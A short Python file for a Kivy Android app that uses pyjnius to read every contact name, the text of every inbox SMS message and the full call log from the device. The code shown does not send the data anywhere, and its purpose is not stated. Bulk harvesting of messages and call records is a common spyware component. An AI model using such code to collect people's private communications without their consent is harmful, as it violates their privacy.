from jnius import autoclass

def get_contacts():
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        ContentResolver = activity.getContentResolver()
        ContactsContract = autoclass('android.provider.ContactsContract$Contacts')
        cursor = ContentResolver.query(
            ContactsContract.CONTENT_URI,
            None, None, None, None
        )
        contacts = []
        if cursor:
            while cursor.moveToNext():
                name_idx = cursor.getColumnIndex('DISPLAY_NAME')
                name = cursor.getString(name_idx)
                contacts.append(name)
            cursor.close()
        return contacts
    except Exception as e:
        return [f'Erro: {e}']

def get_sms():
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        ContentResolver = activity.getContentResolver()
        Uri = autoclass('android.net.Uri')
        SMS_URI = Uri.parse('content://sms/inbox')
        cursor = ContentResolver.query(SMS_URI, None, None, None, None)
        sms_list = []
        if cursor:
            while cursor.moveToNext():
                body_idx = cursor.getColumnIndex('body')
                body = cursor.getString(body_idx)
                sms_list.append(body)
            cursor.close()
        return sms_list
    except Exception as e:
        return [f'Erro: {e}']

def get_calls():
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        ContentResolver = activity.getContentResolver()
        Uri = autoclass('android.net.Uri')
        CALL_URI = Uri.parse('content://call_log/calls')
        cursor = ContentResolver.query(CALL_URI, None, None, None, None)
        calls = []
        if cursor:
            while cursor.moveToNext():
                number_idx = cursor.getColumnIndex('number')
                type_idx = cursor.getColumnIndex('type')
                date_idx = cursor.getColumnIndex('date')
                duration_idx = cursor.getColumnIndex('duration')
                number = cursor.getString(number_idx)
                call_type = cursor.getString(type_idx)
                date = cursor.getString(date_idx)
                duration = cursor.getString(duration_idx)
                calls.append(f'{number} | {call_type} | {date} | {duration}')
            cursor.close()
        return calls
    except Exception as e:
        return [f'Erro: {e}']
